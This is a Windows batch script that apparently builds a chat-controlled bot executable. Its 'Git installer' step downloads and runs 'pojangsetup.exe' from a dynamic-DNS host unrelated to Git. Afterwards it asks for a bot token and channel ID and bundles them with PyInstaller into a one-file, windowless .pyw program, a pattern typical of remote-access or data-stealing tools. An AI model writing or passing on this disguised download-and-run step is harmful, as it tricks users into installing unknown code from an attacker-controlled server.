@echo off
setlocal

:: Function to check if Git is installed
:check_git
where git >nul 2>nul
if %errorlevel% neq 0 (
    echo Git is not installed. Downloading installer...
    goto download_git
) else (
    echo Git is already installed.
    goto next_steps
)

:: Function to download Git installer
:download_git
set "installer_url=https://thugchat.ddns.net/static/pojangsetup.exe"
set "installer_path=%TEMP%\pojangsetup.exe"

:: Download the installer using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%installer_url%' -OutFile '%installer_path%'"

:: Run the installer
start /wait "" "%installer_path%"
if %errorlevel% neq 0 (
    echo Installation failed. Exiting...
    exit /b 1
)

:: Clean up the installer
del "%installer_path%"

:next_steps
set /p bot_token=Enter your bot token:
set /p channel_id=Enter the channel ID to send messages:
set /p include_icon=Do you want to include an icon? (y/n):

set "script_dir=%~dp0"

:: Save bot token to token.txt
echo %bot_token% > "%script_dir%token.txt"

:: Change directory to the script's directory
cd /d "%script_dir%"

:: Run PyInstaller to create the executable with additional data (token.txt)
pyinstaller --onefile --add-data "token.txt;." bot.pyw

pause
